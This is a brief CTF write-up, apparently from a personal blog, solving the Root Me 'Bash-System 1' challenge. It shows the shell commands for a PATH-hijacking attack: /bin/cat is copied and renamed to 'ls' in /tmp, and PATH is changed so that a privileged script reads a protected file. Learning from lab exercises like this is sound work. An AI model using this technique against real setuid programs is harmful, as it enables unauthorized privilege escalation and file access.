---
title: '[Root Me] Bash-System 1'
date: 2022-04-24 09:08 PM
categories: [Root-Me, Script]
tags: [easy, challenge, script]
permalink: /:categories/:title
---

We need to copy cat into /tmp, then change the name to "ls" and change the path to that folder.
Now the script will read it as cat.
```bash
> mkdir /tmp/isntma
> cp /bin/cat /tmp/isntma
> mv /tmp/isntma/cat /tmp/isntma/ls
> export PATH=/tmp/isntma:$PATH
> ./ch11
```
